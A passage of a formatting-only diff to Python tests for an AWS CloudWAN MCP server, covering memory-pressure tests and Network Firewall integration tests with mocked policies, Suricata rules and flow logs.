-                max_growth = max(m['growth_mb'] for m in fragmentation_metrics)
-                total_released = sum(m['released_mb'] for m in fragmentation_metrics)
+                avg_fragmentation = sum(m["fragmentation_ratio"] for m in fragmentation_metrics) / len(
+                    fragmentation_metrics
+                )
+                max_growth = max(m["growth_mb"] for m in fragmentation_metrics)
+                total_released = sum(m["released_mb"] for m in fragmentation_metrics)
 
                 # Fragmentation should be manageable
                 assert avg_fragmentation > 0.3, f"Average fragmentation recovery {avg_fragmentation:.2f} too low"
                 assert max_growth < 100, f"Max memory growth per cycle {max_growth:.1f}MB too high"
                 assert total_released > 0, "Should be able to release fragmented memory"
 
-                print(f"Fragmentation: Avg recovery {avg_fragmentation:.2f}, "
-                      f"Max growth {max_growth:.1f}MB, Total released {total_released:.1f}MB")
+                print(
+                    f"Fragmentation: Avg recovery {avg_fragmentation:.2f}, "
+                    f"Max growth {max_growth:.1f}MB, Total released {total_released:.1f}MB"
+                )
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -782,17 +771,17 @@
                 # Create sparse data structure (affects VSZ more than RSS initially)
                 for i in range(0, 100000, 1000):  # Sparse keys
                     large_sparse_data[i] = {
-                        'data': 'y' * 1000,  # 1KB actual data
-                        'index': i,
-                        'metadata': {'sparse': True}
+                        "data": "y" * 1000,  # 1KB actual data
+                        "index": i,
+                        "metadata": {"sparse": True},
                     }
 
                 return {
-                    'Vpcs': [
+                    "Vpcs": [
                         {
-                            'VpcId': f'vpc-memory-monitor-{len(memory_metrics)}',
-                            'State': 'available',
-                            'SparseData': len(large_sparse_data)
+                            "VpcId": f"vpc-memory-monitor-{len(memory_metrics)}",
+                            "State": "available",
+                            "SparseData": len(large_sparse_data),
                         }
                     ]
                 }
@@ -800,8 +789,7 @@
             mock_client.describe_vpcs.side_effect = monitored_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=memory_monitoring_mock):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=memory_monitoring_mock):
             process = psutil.Process(os.getpid())
 
             for iteration in range(15):
@@ -813,7 +801,7 @@
 
                 result = await discover_vpcs()
                 parsed = json.loads(result)
-                assert parsed['success'] is True
+                assert parsed["success"] is True
 
                 # Capture memory metrics after operation
                 post_memory_info = process.memory_info()
@@ -824,26 +812,28 @@
                 vms_growth = post_vms - pre_vms
                 rss_vms_ratio = post_rss / post_vms if post_vms > 0 else 0
 
-                memory_metrics.append({
-                    'iteration': iteration,
-                    'rss_mb': post_rss,
-                    'vms_mb': post_vms,
-                    'rss_growth': rss_growth,
-                    'vms_growth': vms_growth,
-                    'rss_vms_ratio': rss_vms_ratio
-                })
+                memory_metrics.append(
+                    {
+                        "iteration": iteration,
+                        "rss_mb": post_rss,
+                        "vms_mb": post_vms,
+                        "rss_growth": rss_growth,
+                        "vms_growth": vms_growth,
+                        "rss_vms_ratio": rss_vms_ratio,
+                    }
+                )
 
                 # Periodic cleanup
                 if iteration % 5 == 0:
                     gc.collect()
 
             # Analyze RSS vs VSZ patterns
-            avg_rss_growth = sum(m['rss_growth'] for m in memory_metrics) / len(memory_metrics)
-            avg_vms_growth = sum(m['vms_growth'] for m in memory_metrics) / len(memory_metrics)
-            avg_ratio = sum(m['rss_vms_ratio'] for m in memory_metrics) / len(memory_metrics)
+            avg_rss_growth = sum(m["rss_growth"] for m in memory_metrics) / len(memory_metrics)
+            avg_vms_growth = sum(m["vms_growth"] for m in memory_metrics) / len(memory_metrics)
+            avg_ratio = sum(m["rss_vms_ratio"] for m in memory_metrics) / len(memory_metrics)
 
-            final_rss = memory_metrics[-1]['rss_mb'] - memory_metrics[0]['rss_mb']
-            final_vms = memory_metrics[-1]['vms_mb'] - memory_metrics[0]['vms_mb']
+            final_rss = memory_metrics[-1]["rss_mb"] - memory_metrics[0]["rss_mb"]
+            final_vms = memory_metrics[-1]["vms_mb"] - memory_metrics[0]["vms_mb"]
 
             # Memory monitoring assertions
             assert avg_rss_growth < 20, f"Average RSS growth {avg_rss_growth:.1f}MB per iteration too high"
@@ -851,8 +841,9 @@
             assert final_rss < 200, f"Final RSS growth {final_rss:.1f}MB too high"
             assert final_vms < 400, f"Final VMS growth {final_vms:.1f}MB too high"
 
-            print(f"Memory monitoring: RSS growth {final_rss:.1f}MB, VMS growth {final_vms:.1f}MB, "
-                  f"Ratio {avg_ratio:.2f}")
+            print(
+                f"Memory monitoring: RSS growth {final_rss:.1f}MB, VMS growth {final_vms:.1f}MB, Ratio {avg_ratio:.2f}"
+            )
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -871,12 +862,9 @@
                 # Allocate large chunks of data
                 for chunk in range(100):  # 100 chunks
                     chunk_data = {
-                        'chunk_id': chunk,
-                        'large_array': [f'data-{i}' * 100 for i in range(1000)],  # ~100KB per chunk
-                        'metadata': {
-                            'chunk_size': '100KB',
-                            'pressure_level': 'high'
-                        }
+                        "chunk_id": chunk,
+                        "large_array": [f"data-{i}" * 100 for i in range(1000)],  # ~100KB per chunk
+                        "metadata": {"chunk_size": "100KB", "pressure_level": "high"},
                     }
                     pressure_data.append(chunk_data)
 
@@ -885,26 +873,25 @@
                 for chunk in pressure_data:
                     processed_chunk = {
                         **chunk,
-                        'processed': True,
-                        'processing_data': chunk['large_array'] * 2  # Double the data
+                        "processed": True,
+                        "processing_data": chunk["large_array"] * 2,  # Double the data
                     }
                     processed_data.append(processed_chunk)
 
                 return {
-                    'CoreNetworks': [
+                    "CoreNetworks": [
                         {
-                            'CoreNetworkId': f'core-network-pressure-{len(memory_pressure_events)}',
-                            'State': 'AVAILABLE',
-                            'DataProcessed': len(processed_data)
+                            "CoreNetworkId": f"core-network-pressure-{len(memory_pressure_events)}",
+                            "State": "AVAILABLE",
+                            "DataProcessed": len(processed_data),
                         }
                     ]
                 }
 
             mock_client.list_core_networks.side_effect = pressure_inducing_operation
             return mock_client
-
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=memory_pressure_mock):
 
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=memory_pressure_mock):
             # Monitor swap usage if available
             initial_swap = psutil.swap_memory()
             process = psutil.Process(os.getpid())
@@ -919,7 +906,7 @@
                 end_time = time.time()
 
                 parsed = json.loads(result)
-                assert parsed['success'] is True
+                assert parsed["success"] is True
 
                 post_memory = process.memory_info().rss / 1024 / 1024
                 post_swap = psutil.swap_memory()
@@ -930,41 +917,51 @@
                 execution_time = end_time - start_time
 
                 pressure_event = {
-                    'iteration': iteration,
-                    'memory_growth_mb': memory_growth,
-                    'swap_change_bytes': swap_change,
-                    'execution_time_s': execution_time,
-                    'swap_pressure': swap_change > 0
+                    "iteration": iteration,
+                    "memory_growth_mb": memory_growth,
+                    "swap_change_bytes": swap_change,
+                    "execution_time_s": execution_time,
+                    "swap_pressure": swap_change > 0,
                 }
                 memory_pressure_events.append(pressure_event)
 
-                swap_usage_samples.append({
-                    'iteration': iteration,
-                    'swap_used_mb': post_swap.used / 1024 / 1024,
-                    'swap_percent': post_swap.percent
-                })
+                swap_usage_samples.append(
+                    {
+                        "iteration": iteration,
+                        "swap_used_mb": post_swap.used / 1024 / 1024,
+                        "swap_percent": post_swap.percent,
+                    }
+                )
 
                 # Cleanup to prevent excessive swap usage
                 if iteration % 3 == 0:
                     gc.collect()
 
             # Analyze swap usage patterns
-            max_swap_usage = max(s['swap_used_mb'] for s in swap_usage_samples)
-            avg_execution_time = sum(e['execution_time_s'] for e in memory_pressure_events) / len(memory_pressure_events)
-            swap_pressure_events = sum(1 for e in memory_pressure_events if e['swap_pressure'])
+            max_swap_usage = max(s["swap_used_mb"] for s in swap_usage_samples)
+            avg_execution_time = sum(e["execution_time_s"] for e in memory_pressure_events) / len(
+                memory_pressure_events
+            )
+            swap_pressure_events = sum(1 for e in memory_pressure_events if e["swap_pressure"])
 
             # Swap usage should be reasonable
             assert max_swap_usage < 1000, f"Max swap usage {max_swap_usage:.1f}MB too high"
-            assert avg_execution_time < 5.0, f"Average execution time {avg_execution_time:.2f}s indicates swap thrashing"
-            assert swap_pressure_events <= len(memory_pressure_events) * 0.5, f"Too many swap pressure events: {swap_pressure_events}"
+            assert avg_execution_time < 5.0, (
+                f"Average execution time {avg_execution_time:.2f}s indicates swap thrashing"
+            )
+            assert swap_pressure_events <= len(memory_pressure_events) * 0.5, (
+                f"Too many swap pressure events: {swap_pressure_events}"
+            )
 
             final_swap = psutil.swap_memory()
             swap_growth = (final_swap.used - initial_swap.used) / 1024 / 1024  # MB
 
             assert swap_growth < 500, f"Total swap growth {swap_growth:.1f}MB too high"
 
-            print(f"Swap usage: Max {max_swap_usage:.1f}MB, Growth {swap_growth:.1f}MB, "
-                  f"Pressure events {swap_pressure_events}")
+            print(
+                f"Swap usage: Max {max_swap_usage:.1f}MB, Growth {swap_growth:.1f}MB, "
+                f"Pressure events {swap_pressure_events}"
+            )
 
 
 class TestMemoryBoundThrottling:
@@ -993,12 +990,14 @@
                 # Implement memory-based throttling
                 if current_memory > memory_threshold_mb:
                     throttled_operations += 1
-                    throttle_events.append({
-                        'timestamp': time.time(),
-                        'memory_mb': current_memory,
-                        'threshold_mb': memory_threshold_mb,
-                        'operation': 'throttled'
-                    })
+                    throttle_events.append(
+                        {
+                            "timestamp": time.time(),
+                            "memory_mb": current_memory,
+                            "threshold_mb": memory_threshold_mb,
+                            "operation": "throttled",
+                        }
+                    )
 
                     # Simulate throttling delay
                     time.sleep(0.1)
@@ -1011,38 +1010,34 @@
                     if post_gc_memory > memory_threshold_mb:
                         raise ClientError(
                             {
-                                'Error': {
-                                    'Code': 'MemoryPressureThrottling',
-                                    'Message': f'Operation throttled due to memory pressure: {post_gc_memory:.1f}MB > {memory_threshold_mb}MB'
+                                "Error": {
+                                    "Code": "MemoryPressureThrottling",
+                                    "Message": f"Operation throttled due to memory pressure: {post_gc_memory:.1f}MB > {memory_threshold_mb}MB",
                                 }
                             },
-                            'MemoryBoundOperation'
+                            "MemoryBoundOperation",
                         )
 
                 successful_operations += 1
 
                 # Create memory-intensive response
                 large_data = {
-                    'operation_id': successful_operations,
-                    'large_payload': 'x' * 1000000,  # 1MB payload
-                    'metadata': {
-                        'memory_at_execution': current_memory,
-                        'throttle_threshold': memory_threshold_mb
-                    }
+                    "operation_id": successful_operations,
+                    "large_payload": "x" * 1000000,  # 1MB payload
+                    "metadata": {"memory_at_execution": current_memory, "throttle_threshold": memory_threshold_mb},
                 }
 
                 return {
-                    'CoreNetworkPolicy': {
-                        'PolicyVersionId': str(successful_operations),
-                        'PolicyDocument': json.dumps(large_data)
+                    "CoreNetworkPolicy": {
+                        "PolicyVersionId": str(successful_operations),
+                        "PolicyDocument": json.dumps(large_data),
                     }
                 }
 
             mock_client.get_core_network_policy.side_effect = memory_bound_operation
             return mock_client
-
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=memory_aware_mock):
 
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=memory_aware_mock):
             process = psutil.Process(os.getpid())
             initial_memory = process.memory_info().rss / 1024 / 1024
 
@@ -1053,16 +1048,16 @@
 
             for i in range(operations_attempted):
                 try:
-                    result = await get_core_network_policy(f'core-network-throttle-{i:03d}')
+                    result = await get_core_network_policy(f"core-network-throttle-{i:03d}")
                     parsed = json.loads(result)
 
-                    if parsed['success']:
+                    if parsed["success"]:
                         successful_results.append(parsed)
                     else:
                         failed_results.append(parsed)
 
                 except Exception as e:
-                    failed_results.append({'error': str(e), 'operation_num': i})
+                    failed_results.append({"error": str(e), "operation_num": i})
 
                 # Periodic memory cleanup
                 if i % 10 == 0:
@@ -1079,11 +1074,17 @@
             # Throttling mechanism assertions
             assert success_ratio > 0.6, f"Success ratio {success_ratio:.2f} too low under memory pressure"
             assert total_memory_growth < 300, f"Memory growth {total_memory_growth:.1f}MB despite throttling"
-            assert len(throttle_events) > 0 or total_memory_growth < memory_threshold_mb, "Throttling should activate under memory pressure"
+            assert len(throttle_events) > 0 or total_memory_growth < memory_threshold_mb, (
+                "Throttling should activate under memory pressure"
+            )
 
             if throttle_events:
-                avg_throttle_memory = sum(e['memory_mb'] for e in throttle_events) / len(throttle_events)
-                assert avg_throttle_memory >= memory_threshold_mb, f"Throttling activated below threshold: {avg_throttle_memory:.1f}MB"
+                avg_throttle_memory = sum(e["memory_mb"] for e in throttle_events) / len(throttle_events)
+                assert avg_throttle_memory >= memory_threshold_mb, (
+                    f"Throttling activated below threshold: {avg_throttle_memory:.1f}MB"
+                )
 
-            print(f"Memory throttling: {successful_operations} successful, {throttled_operations} throttled, "
-                  f"{len(throttle_events)} throttle events, {total_memory_growth:.1f}MB growth")
+            print(
+                f"Memory throttling: {successful_operations} successful, {throttled_operations} throttled, "
+                f"{len(throttle_events)} throttle events, {total_memory_growth:.1f}MB growth"
+            )

--- cloudwan-mcp-server/tests/integration/test_network_firewall_integration.py
+++ cloudwan-mcp-server/tests/integration/test_network_firewall_integration.py
@@ -26,20 +26,20 @@
     analyze_anfw_policy,
     analyze_five_tuple_flow,
     parse_suricata_rules,
-    simulate_policy_changes
+    simulate_policy_changes,
 )
 
 
 @pytest.mark.integration
 class TestANFWToolsIntegration:
     """Integration test suite for all ANFW tools working together."""
-    
+
     @pytest.fixture
     def comprehensive_firewall_setup(self):
         """Comprehensive firewall mock setup with multiple resources."""
         nfw_client = Mock()
         logs_client = Mock()
-        
+
         # Mock multiple firewalls
         firewalls = {
             "production-firewall": {
@@ -47,13 +47,10 @@
                     "FirewallName": "production-firewall",
                     "FirewallArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall/production-firewall",
                     "VpcId": "vpc-prod-12345",
-                    "SubnetMappings": [
-                        {"SubnetId": "subnet-prod-1"}, 
-                        {"SubnetId": "subnet-prod-2"}
-                    ],
-                    "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/production-policy"
+                    "SubnetMappings": [{"SubnetId": "subnet-prod-1"}, {"SubnetId": "subnet-prod-2"}],
+                    "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/production-policy",
                 },
-                "FirewallStatus": {"Status": "READY"}
+                "FirewallStatus": {"Status": "READY"},
             },
             "staging-firewall": {
                 "Firewall": {
@@ -61,12 +58,12 @@
                     "FirewallArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall/staging-firewall",
                     "VpcId": "vpc-staging-12345",
                     "SubnetMappings": [{"SubnetId": "subnet-staging-1"}],
-                    "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/staging-policy"
+                    "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/staging-policy",
                 },
-                "FirewallStatus": {"Status": "READY"}
-            }
+                "FirewallStatus": {"Status": "READY"},
+            },
         }
-        
+
         # Dynamic firewall responses based on name
         def mock_describe_firewall(**kwargs):
             if "FirewallName" in kwargs:
@@ -74,58 +71,70 @@
             else:
                 # Extract from ARN
                 arn = kwargs["FirewallArn"]
-                name = arn.split('/')[-1]
-            
+                name = arn.split("/")[-1]
+
             if name in firewalls:
                 return firewalls[name]
             else:
                 raise ClientError(
-                    error_response={'Error': {'Code': 'ResourceNotFoundException', 'Message': f'Firewall {name} not found'}},
-                    operation_name='DescribeFirewall'
+                    error_response={
+                        "Error": {"Code": "ResourceNotFoundException", "Message": f"Firewall {name} not found"}
+                    },
+                    operation_name="DescribeFirewall",
                 )
-        
+
         nfw_client.describe_firewall.side_effect = mock_describe_firewall
-        
+
         # Mock comprehensive policy responses
         policies = {
             "production-policy": {
                 "FirewallPolicy": {
                     "StatelessRuleGroups": [
-                        {"ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateless-rulegroup/prod-stateless"}
+                        {
+                            "ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateless-rulegroup/prod-stateless"
+                        }
                     ],
                     "StatefulRuleGroups": [
-                        {"ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateful-rulegroup/prod-stateful-web"},
-                        {"ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateful-rulegroup/prod-stateful-security"}
+                        {
+                            "ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateful-rulegroup/prod-stateful-web"
+                        },
+                        {
+                            "ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateful-rulegroup/prod-stateful-security"
+                        },
                     ],
                     "StatelessDefaultActions": ["aws:forward_to_sfe"],
-                    "StatelessFragmentDefaultActions": ["aws:drop"]
+                    "StatelessFragmentDefaultActions": ["aws:drop"],
                 }
             },
             "staging-policy": {
                 "FirewallPolicy": {
                     "StatelessRuleGroups": [],
                     "StatefulRuleGroups": [
-                        {"ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateful-rulegroup/staging-stateful"}
+                        {
+                            "ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateful-rulegroup/staging-stateful"
+                        }
                     ],
                     "StatelessDefaultActions": ["aws:pass"],
-                    "StatelessFragmentDefaultActions": ["aws:pass"]
+                    "StatelessFragmentDefaultActions": ["aws:pass"],
                 }
-            }
+            },
         }
-        
+
         def mock_describe_policy(**kwargs):
             policy_arn = kwargs["FirewallPolicyArn"]
-            policy_name = policy_arn.split('/')[-1]
+            policy_name = policy_arn.split("/")[-1]
             if policy_name in policies:
                 return policies[policy_name]
             else:
                 raise ClientError(
-                    error_response={'Error': {'Code': 'ResourceNotFoundException', 'Message': f'Policy {policy_name} not found'}},
-                    operation_name='DescribeFirewallPolicy'
+                    error_response={
+                        "Error": {"Code": "ResourceNotFoundException", "Message": f"Policy {policy_name} not found"}
+                    },
+                    operation_name="DescribeFirewallPolicy",
                 )
-        
+
         nfw_client.describe_firewall_policy.side_effect = mock_describe_policy
-        
+
         # Mock rule groups with comprehensive Suricata rules
         rule_groups = {
             "prod-stateful-web": {
@@ -154,22 +163,24 @@
 pass tcp any any -> any 443 (msg:"HTTPS traffic allowed in staging"; sid:5002; rev:1;)"""
                     }
                 }
-            }
+            },
         }
-        
+
         def mock_describe_rule_group(**kwargs):
             rule_arn = kwargs["RuleGroupArn"]
-            rule_name = rule_arn.split('/')[-1]
+            rule_name = rule_arn.split("/")[-1]
             if rule_name in rule_groups:
                 return rule_groups[rule_name]
             else:
                 raise ClientError(
-                    error_response={'Error': {'Code': 'ResourceNotFoundException', 'Message': f'Rule group {rule_name} not found'}},
-                    operation_name='DescribeRuleGroup'
+                    error_response={
+                        "Error": {"Code": "ResourceNotFoundException", "Message": f"Rule group {rule_name} not found"}
+                    },
+                    operation_name="DescribeRuleGroup",
                 )
-        
+
         nfw_client.describe_rule_group.side_effect = mock_describe_rule_group
-        
+
         # Mock logging configuration
         def mock_logging_config(**kwargs):
             firewall_arn = kwargs["FirewallArn"]
@@ -179,59 +190,66 @@
                         {
                             "LogType": "FLOW",
                             "LogDestinationType": "CloudWatchLogs",
-                            "LogDestination": {
-                                "logGroup": f"/aws/network-firewall/{firewall_arn.split('/')[-1]}"
-                            }
+                            "LogDestination": {"logGroup": f"/aws/network-firewall/{firewall_arn.split('/')[-1]}"},
                         },
                         {
                             "LogType": "ALERT",
-                            "LogDestinationType": "CloudWatchLogs", 
+                            "LogDestinationType": "CloudWatchLogs",
                             "LogDestination": {
                                 "logGroup": f"/aws/network-firewall/{firewall_arn.split('/')[-1]}-alerts"
-                            }
-                        }
+                            },
+                        },
                     ]
                 }
             }
-        
+
         nfw_client.describe_logging_configuration.side_effect = mock_logging_config
-        
+
         # Mock comprehensive CloudWatch Logs responses
         query_results = {
             "flow": [
                 [
                     {"field": "@timestamp", "value": "2023-01-01T12:00:00.000Z"},
-                    {"field": "@message", "value": "FLOW srcaddr=10.0.1.100 dstaddr=172.16.2.200 srcport=12345 dstport=80 protocol=6 action=ALLOW"}
+                    {
+                        "field": "@message",
+                        "value": "FLOW srcaddr=10.0.1.100 dstaddr=172.16.2.200 srcport=12345 dstport=80 protocol=6 action=ALLOW",
+                    },
                 ],
                 [
                     {"field": "@timestamp", "value": "2023-01-01T12:01:00.000Z"},
-                    {"field": "@message", "value": "FLOW srcaddr=10.0.1.101 dstaddr=172.16.2.200 srcport=12346 dstport=443 protocol=6 action=ALLOW"}
+                    {
+                        "field": "@message",
+                        "value": "FLOW srcaddr=10.0.1.101 dstaddr=172.16.2.200 srcport=12346 dstport=443 protocol=6 action=ALLOW",
+                    },
                 ],
                 [
-                    {"field": "@timestamp", "value": "2023-01-01T12:02:00.000Z"}, 
-                    {"field": "@message", "value": "FLOW srcaddr=192.168.1.50 dstaddr=10.0.1.200 srcport=54321 dstport=22 protocol=6 action=DENY"}
-                ]
+                    {"field": "@timestamp", "value": "2023-01-01T12:02:00.000Z"},
+                    {
+                        "field": "@message",
+                        "value": "FLOW srcaddr=192.168.1.50 dstaddr=10.0.1.200 srcport=54321 dstport=22 protocol=6 action=DENY",
+                    },
+                ],
             ],
             "alert": [
                 [
                     {"field": "@timestamp", "value": "2023-01-01T12:00:30.000Z"},
-                    {"field": "@message", "value": "ALERT SSH access blocked from 192.168.1.50 to 10.0.1.200:22"}
+                    {"field": "@message", "value": "ALERT SSH access blocked from 192.168.1.50 to 10.0.1.200:22"},
                 ],
                 [
                     {"field": "@timestamp", "value": "2023-01-01T12:01:15.000Z"},
-                    {"field": "@message", "value": "ALERT RDP access attempt from 172.16.1.100 to 10.0.2.150:3389"}
-                ]
-            ]
+                    {"field": "@message", "value": "ALERT RDP access attempt from 172.16.1.100 to 10.0.2.150:3389"},
+                ],
+            ],
         }
-        
+
         logs_client.start_query.return_value = {"queryId": "integration-query-123"}
-        
+
         def mock_get_query_results(**kwargs):
             # Simulate query completion after multiple calls
-            if not hasattr(mock_get_query_results, 'call_count'):
+            if not hasattr(mock_get_query_results, "call_count"):
                 mock_get_query_results.call_count = 0
             mock_get_query_results.call_count += 1
-            
+
             # First few calls return Running, then Complete
             if mock_get_query_results.call_count < 3:
                 return {"status": "Running"}
@@ -239,174 +257,199 @@
                 # Determine log type from query string context
                 log_type = "flow"  # Default
                 # This would be more sophisticated in real implementation
-                return {
-                    "status": "Complete",
-                    "results": query_results[log_type]
-                }
-        
+                return {"status": "Complete", "results": query_results[log_type]}
+
         logs_client.get_query_results.side_effect = mock_get_query_results
-        
+
         return nfw_client, logs_client
-    
+
     @pytest.mark.asyncio
     async def test_full_anfw_workflow_production(self, comprehensive_firewall_setup):
         """Test complete ANFW workflow for production environment."""
         nfw_client, logs_client = comprehensive_firewall_setup
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client), \
-             patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client', return_value=logs_client):
-            
+
+        with (
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+                return_value=nfw_client,
+            ),
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client",
+                return_value=logs_client,
+            ),
+        ):
             # Step 1: Analyze firewall policy
             policy_result = await analyze_anfw_policy("production-firewall", include_compliance_check=True)
             policy_data = json.loads(policy_result)
-            
+
             assert policy_data["success"] is True
             assert policy_data["analysis"]["firewall_details"]["name"] == "production-firewall"
             assert policy_data["analysis"]["policy_summary"]["stateful_rule_groups"] == 2
             assert policy_data["analysis"]["policy_summary"]["stateless_rule_groups"] == 1
-            
+
             # Step 2: Parse Suricata rules for L7 analysis
             rules_result = await parse_suricata_rules("production-firewall", analyze_l7_rules=True)
             rules_data = json.loads(rules_result)
-            
+
             assert rules_data["success"] is True
             assert len(rules_data["parsed_rules"]) > 0
             assert "l7_analysis" in rules_data
             assert rules_data["l7_analysis"]["security_analysis"]["total_rules"] > 0
-            
+
             # Step 3: Monitor logs for recent activity
             logs_result = await monitor_anfw_logs("production-firewall", "flow", 120)
             logs_data = json.loads(logs_result)
-            
+
             assert logs_data["success"] is True
             assert "log_entries" in logs_data
             assert "analysis" in logs_data
-            
+
             # Step 4: Test specific 5-tuple flows based on log analysis
             flow_result = await analyze_five_tuple_flow(
                 "production-firewall", "10.0.1.100", "172.16.2.200", "TCP", 12345, 80
             )
             flow_data = json.loads(flow_result)
-            
+
             assert flow_data["success"] is True
             assert flow_data["flow_analysis"]["flow_details"]["source_ip"] == "10.0.1.100"
-            
+
             # Step 5: Simulate policy changes based on findings
             simulation_result = await simulate_policy_changes(
                 "production-firewall",
                 "Block all SSH traffic from external networks",
-                ["192.168.1.50:54321->10.0.1.200:22/TCP"]
+                ["192.168.1.50:54321->10.0.1.200:22/TCP"],
             )
             simulation_data = json.loads(simulation_result)
-            
+
             assert simulation_data["success"] is True
             assert "simulation_result" in simulation_data
             assert "impact_analysis" in simulation_data["simulation_result"]
-    
+
     @pytest.mark.asyncio
     async def test_anfw_cross_environment_comparison(self, comprehensive_firewall_setup):
         """Test ANFW analysis across production and staging environments."""
         nfw_client, logs_client = comprehensive_firewall_setup
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client), \
-             patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client', return_value=logs_client):
-            
+
+        with (
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+                return_value=nfw_client,
+            ),
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client",
+                return_value=logs_client,
+            ),
+        ):
             # Analyze production firewall
             prod_policy = await analyze_anfw_policy("production-firewall")
             prod_data = json.loads(prod_policy)
-            
+
             # Analyze staging firewall
             staging_policy = await analyze_anfw_policy("staging-firewall")
             staging_data = json.loads(staging_policy)
-            
+
             # Compare configurations
             assert prod_data["success"] is True
             assert staging_data["success"] is True
-            
+
             # Production should have more restrictive default actions
             prod_actions = prod_data["analysis"]["policy_summary"]["stateless_default_actions"]
             staging_actions = staging_data["analysis"]["policy_summary"]["stateless_default_actions"]
-            
+
             assert "aws:forward_to_sfe" in prod_actions  # More secure
             assert "aws:pass" in staging_actions  # More permissive for testing
-            
+
             # Production should have more rule groups
             prod_rules = prod_data["analysis"]["policy_summary"]["stateful_rule_groups"]
             staging_rules = staging_data["analysis"]["policy_summary"]["stateful_rule_groups"]
-            
+
             assert prod_rules > staging_rules
-    
+
     @pytest.mark.asyncio
     async def test_anfw_error_resilience(self, comprehensive_firewall_setup):
         """Test ANFW tools resilience to various error conditions."""
         nfw_client, logs_client = comprehensive_firewall_setup
-        
+
         # Test partial failures - some operations succeed, others fail
         def failing_describe_rule_group(**kwargs):
             rule_arn = kwargs["RuleGroupArn"]
             if "security" in rule_arn:
                 # Simulate intermittent failure for security rule group
                 raise ClientError(
-                    error_response={'Error': {'Code': 'ThrottlingException', 'Message': 'Rate exceeded'}},
-                    operation_name='DescribeRuleGroup'
+                    error_response={"Error": {"Code": "ThrottlingException", "Message": "Rate exceeded"}},
+                    operation_name="DescribeRuleGroup",
                 )
             else:
                 # Other rule groups succeed
                 return {
                     "RuleGroup": {
                         "RulesSource": {
-                            "RulesString": "alert tcp any any -> any 80 (msg:\"HTTP traffic\"; sid:1; rev:1;)"
+                            "RulesString": 'alert tcp any any -> any 80 (msg:"HTTP traffic"; sid:1; rev:1;)'
                         }
                     }
                 }
-        
+
         nfw_client.describe_rule_group.side_effect = failing_describe_rule_group
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client), \
-             patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client', return_value=logs_client):
-            
+
+        with (
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+                return_value=nfw_client,
+            ),
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client",
+                return_value=logs_client,
+            ),
+        ):
             # Should handle partial failures gracefully
             result = await parse_suricata_rules("production-firewall")
             data = json.loads(result)
-            
+
             assert data["success"] is True  # Should still succeed
             # Should have some rules (from non-failing rule groups)
             assert len(data["parsed_rules"]) > 0
-    
+
     @pytest.mark.asyncio
     async def test_anfw_performance_under_load(self, comprehensive_firewall_setup):
         """Test ANFW tools performance under concurrent load."""
         nfw_client, logs_client = comprehensive_firewall_setup
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client), \
-             patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client', return_value=logs_client):
-            
+
+        with (
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+                return_value=nfw_client,
+            ),
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client",
+                return_value=logs_client,
+            ),
+        ):
             # Simulate concurrent operations
             tasks = []
-            
+
             # Multiple policy analyses
             for firewall in ["production-firewall", "staging-firewall"]:
                 tasks.append(analyze_anfw_policy(firewall))
-            
+
             # Multiple log monitoring requests
             for log_type in ["flow", "alert"]:
                 tasks.append(monitor_anfw_logs("production-firewall", log_type, 60))
-            
+
             # Multiple 5-tuple analyses
             test_flows = [
                 ("10.0.1.100", "172.16.2.200", "TCP", 12345, 80),
                 ("10.0.1.101", "172.16.2.201", "TCP", 12346, 443),
-                ("192.168.1.50", "10.0.1.200", "TCP", 54321, 22)
+                ("192.168.1.50", "10.0.1.200", "TCP", 54321, 22),
             ]
-            
+
             for src_ip, dst_ip, protocol, src_port, dst_port in test_flows:
-                tasks.append(analyze_five_tuple_flow(
